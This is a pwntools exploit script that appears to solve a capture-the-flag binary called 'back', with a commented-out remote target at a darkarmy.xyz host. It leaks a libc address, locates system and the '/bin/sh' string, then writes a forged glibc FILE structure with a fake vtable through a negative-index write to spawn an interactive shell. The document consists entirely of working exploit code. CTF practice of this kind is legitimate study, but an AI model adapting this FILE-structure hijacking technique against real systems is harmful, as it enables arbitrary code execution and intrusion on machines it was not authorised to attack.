from pwn import *

LIBC = ELF("../libc/libc.so.6",checksec = False)
bin = ELF("./back")
r = process('./back',env = {"LD_PRELOAD": "../libc/libc.so.6"})
#r = remote("butterfly.darkarmy.xyz",32770)

reu = lambda a : r.recvuntil(a)
sla = lambda a,b : r.sendlineafter(a,b)
sl = lambda a : r.sendline(a)
rel = lambda : r.recvline()
sa = lambda a,b : r.sendafter(a,b)
re = lambda a : r.recv(a)

def name(data):
    sla("name: ",data)

def write(index, data):
    sla("write: ",str(index))
    sla("data: ",data)

if __name__ == "__main__":
    gdb.attach(r)
    name('a'*0x50)
    reu('a'*0x50)
    libc = u64(re(6) + '\x00'*2) - 0x1b39e7
    log.info("libc = " + hex(libc))
    rip = libc + LIBC.symbols['system']
    rdi = libc + next(LIBC.search("/bin/sh"))
    read_ptr = libc + 0x3ec7e3
    io_wstr_finish = libc + LIBC.symbols['_IO_file_jumps'] - 0x3635a0 
    log.info("io_wstr_finish = " + hex(io_wstr_finish))
    io_str_overflow_ptr_addr = libc + LIBC.symbols['_IO_file_jumps'] + 0xd8
    fake_vtable_addr = io_str_overflow_ptr_addr - 2*8
    lock = libc + 0x3ed8c0

    file_struct = p64(0xfbad2887) + p64(read_ptr)
    file_struct += p64(read_ptr)*2
    file_struct += p64(0)
    file_struct += p64((rdi-100)/2 + 1)
    file_struct += p64(0)*2
    file_struct += p64((rdi-100)/2)
    file_struct += p64(0)
    file_struct += p64(0)
    file_struct += p64((rdi-100)/2)
    file_struct += p64(0)
    file_struct += p64(libc + 0x3eba00)
    file_struct += p64(1) + p64(0xffffffffffffffff) + p64(0) + p64(libc + 0x3ed8c0)
    file_struct += p64(0xffffffffffffffff) + p64(0) + p64(libc + 0x3eb8c0) + p64(0)*3
    file_struct += p64(0x00000000ffffffff) + p64(0)*2 + p64(fake_vtable_addr-8) 
    file_struct += p64(rip)
    write(-6,file_struct)
    r.interactive()
